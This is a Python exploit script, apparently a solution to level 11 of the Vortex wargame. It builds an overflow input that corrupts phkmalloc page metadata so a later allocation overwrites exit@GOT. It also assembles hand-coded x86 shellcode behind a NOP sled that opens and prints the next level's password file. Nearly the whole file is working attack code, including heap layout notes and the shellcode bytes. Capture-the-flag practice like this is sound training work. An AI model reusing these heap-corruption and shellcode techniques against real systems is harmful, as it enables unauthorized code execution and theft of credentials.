#!/usr/bin/env python3
# Build the L11 craft payload (argv[1]) and the EGG sled (shellcode).
#
# Heap layout (gdb-verified):
#   a = malloc(0x800) -> 0x804f000
#   b = malloc(0x10)  -> 0x8050030
#   c = malloc(0x800) -> 0x804f800   <-- argv[1] lands here
#   d = malloc(0x10)  -> 0x8050040
#
# c spans 0x804f800..0x8050000 (2048 bytes); byte 2048 is the page
# header of the NEXT phkmalloc page (0x8050000): prev/next/info/bitmap.
#
# The overflow: strcpy(c, argv[1]) has no bound, so 2048 filler bytes
# reach the page header and 9 more craft bytes overwrite it:
#   prev  = 0x11111111 (junk)
#   next  = 0x0804cfdc (points INTO the old a-chunk region)
#   info  = 0x11       (byte; copy stops at the NUL right after)
#
# Then d = malloc(0x10) walks the corrupt list: it lands on a fake
# chunk whose bit_index shift gives base+64 == 0x804d01c == exit@GOT.
# strncpy(d, argv[2], 15) then writes 15 bytes over exit@GOT.
import struct

# the password shellcode: NUL-free, 73 bytes, int 0x80 open/read/write
#   build "/etc/vortex_pass/vortex1" on the stack (7 dwords), then
#   mov byte [ebx+24],'2'  -> "/etc/vortex_pass/vortex12", then
#   open(eax=5)/read(eax=3)/write(eax=4)/exit(eax=1) via int 0x80
SC = bytes.fromhex(
    '31c050'
    '6874657831'  # push 0x31786574  'tex1'
    '682f766f72'  # push 0x726f762f  'vor/'
    '6870617373'  # push 0x73736170  'pass'
    '687465785f'  # push 0x5f786574  'tex_'
    '682f766f72'  # push 0x726f762f  'vor/'
    '682f657463'  # push 0x6374652f  '/etc'
    '89e3'
    'c6431832'    # mov byte [ebx+24], 0x32   '1'->'2'
    '31c9'  'b005'  'cd80'   # open(path, 0)
    '89c3'
    'b003'  '89e1'  '31d2'  'b264'  'cd80'   # read(fd, path, 100)
    '89c2'
    'b004'  'b301'  '89e1'  'cd80'   # write(1, buf, n)
    'b001'  '31db'  'cd80')  # exit(0)
assert len(SC) == 73 and b'\x00' not in SC

# craft: 2048 filler + prev(4) + next(4) + info byte
craft = b'A'*2048
craft += struct.pack('<I', 0x11111111)
craft += struct.pack('<I', 0x0804cfdc)
craft += b'\x11'
assert len(craft) == 2057 and b'\x00' not in craft

# egg: big NOP sled so the exact shellcode address needs no precision
egg  = b'\x90'*1500 + SC

open('craft.bin','wb').write(craft)
open('egg.bin','wb').write(egg)
print('craft', len(craft), 'egg', len(egg))
